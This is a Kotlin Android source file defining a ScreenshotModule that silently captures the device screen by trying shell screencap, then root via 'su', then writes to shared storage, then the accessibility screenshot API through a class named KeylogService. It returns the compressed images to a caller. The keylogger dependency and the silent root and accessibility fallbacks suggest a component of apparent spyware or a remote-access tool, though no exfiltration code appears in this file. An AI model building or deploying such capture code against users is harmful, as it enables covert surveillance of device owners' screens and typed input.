package com.openaccess.sdk.service

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.util.Log
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class ScreenshotModule(private val context: android.content.Context) {

    companion object {
        private const val TAG = "ScreenshotModule"
        private const val QUALITY = 85
        private const val MAX_DIM = 1920
    }

    interface Callback {
        fun onSuccess(data: ByteArray)
        fun onFailure(error: String)
    }

    fun capture(callback: Callback) {
        Log.d(TAG, "start")

        val tmpDir = context.cacheDir.resolve("ss").also { it.mkdirs() }
        val tmpFile = File(tmpDir, "screen_${System.currentTimeMillis()}.png")

        // 1. Direct screencap (works on emulator without root)
        Log.d(TAG, "trying direct screencap")
        val directResult = captureDirect(tmpFile)
        if (directResult != null) {
            val processed = processBytes(directResult)
            if (processed != null) { callback.onSuccess(processed); return }
        }

        // 2. Root (emulator with su)
        Log.d(TAG, "trying root")
        val rootResult = captureRoot(tmpFile)
        if (rootResult != null) {
            val processed = processBytes(rootResult)
            if (processed != null) { callback.onSuccess(processed); return }
        }

        // 3. ADB (emulator)
        Log.d(TAG, "trying adb")
        val adbResult = captureADB(tmpFile)
        if (adbResult != null) {
            val processed = processBytes(adbResult)
            if (processed != null) { callback.onSuccess(processed); return }
        }

        // 4. AccessibilityService (Android 14+)
        if (Build.VERSION.SDK_INT >= 34 && KeylogService.isRunning) {
            Log.d(TAG, "trying accessibility")
            captureAccessibility(callback)
            return
        }

        Log.d(TAG, "all methods failed")
        callback.onFailure("No screenshot method available. Need: Root, ADB, or AccessibilityService")
    }

    private fun shellEscape(path: String): String {
        return path.replace("'", "'\\''")
    }

    private fun captureDirect(tmpFile: File): ByteArray? {
        return try {
            val proc = ProcessBuilder("sh", "-c", "screencap -p '${shellEscape(tmpFile.absolutePath)}'")
                .redirectErrorStream(true).start()
            val ok = proc.waitFor(10, TimeUnit.SECONDS)
            if (!ok) { proc.destroyForcibly(); return null }
            if (proc.exitValue() != 0) return null
            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
            val bytes = tmpFile.readBytes()
            tmpFile.delete()
            bytes
        } catch (e: Exception) {
            Log.e(TAG, "Direct failed: ${e.message}")
            null
        }
    }

    private fun captureRoot(tmpFile: File): ByteArray? {
        return try {
            val proc = ProcessBuilder("su", "-c", "screencap -p '${shellEscape(tmpFile.absolutePath)}'")
                .redirectErrorStream(true).start()
            val ok = proc.waitFor(10, TimeUnit.SECONDS)
            if (!ok) { proc.destroyForcibly(); return null }
            if (proc.exitValue() != 0) return null
            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
            val bytes = tmpFile.readBytes()
            tmpFile.delete()
            bytes
        } catch (e: Exception) {
            Log.e(TAG, "Root failed: ${e.message}")
            null
        }
    }

    private fun captureADB(tmpFile: File): ByteArray? {
        return try {
            val dirs = listOf(
                File("/sdcard"),
                File("/storage/emulated/0"),
                context.cacheDir.resolve("ss").also { it.mkdirs() }
            )
            for (dir in dirs) {
                try {
                    dir.mkdirs()
                    val f = File(dir, "screen.png")
                    val proc = ProcessBuilder("sh", "-c", "screencap -p '${shellEscape(f.absolutePath)}'")
                        .redirectErrorStream(true).start()
                    val ok = proc.waitFor(10, TimeUnit.SECONDS)
                    if (ok && proc.exitValue() == 0 && f.exists() && f.length() > 0) {
                        val bytes = f.readBytes()
                        f.delete()
                        return bytes
                    }
                    proc.destroyForcibly()
                } catch (_: Exception) {}
            }
            null
        } catch (e: Exception) {
            Log.e(TAG, "ADB failed: ${e.message}")
            null
        }
    }

    private fun captureAccessibility(callback: Callback) {
        val svc = KeylogService.instance ?: run {
            callback.onFailure("AccessibilityService not active")
            return
        }
        if (Build.VERSION.SDK_INT < 34) {
            callback.onFailure("Accessibility screenshot requires API 34+")
            return
        }
        val exec = Executors.newSingleThreadExecutor()
        svc.takeScreenshot(
            android.view.Display.DEFAULT_DISPLAY,
            exec,
            object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                    try {
                        val bitmap = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                        if (bitmap == null) { callback.onFailure("Bitmap wrap failed"); exec.shutdown(); return }
                        val bytes = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, bytes)
                        bitmap.recycle()
                        callback.onSuccess(bytes.toByteArray())
                    } catch (e: Exception) {
                        callback.onFailure("Accessibility: ${e.message}")
                    } finally {
                        exec.shutdown()
                    }
                }

                override fun onFailure(errorCode: Int) {
                    callback.onFailure("Accessibility screenshot failed: code=$errorCode")
                    exec.shutdown()
                }
            }
        )
    }

    private fun processBytes(data: ByteArray): ByteArray? {
        return try {
            val bmp = BitmapFactory.decodeByteArray(data, 0, data.size) ?: return data
            val w = bmp.width; val h = bmp.height
            val resized = if (w > MAX_DIM || h > MAX_DIM) {
                val r = MAX_DIM.toFloat() / maxOf(w, h)
                Bitmap.createScaledBitmap(bmp, (w * r).toInt(), (h * r).toInt(), true)
                    .also { if (it !== bmp) bmp.recycle() }
            } else bmp
            val out = ByteArrayOutputStream()
            resized.compress(Bitmap.CompressFormat.JPEG, QUALITY, out)
            if (resized !== bmp) resized.recycle()
            out.toByteArray()
        } catch (e: Exception) {
            Log.e(TAG, "processBytes: ${e.message}, returning raw")
            data
        }
    }
}
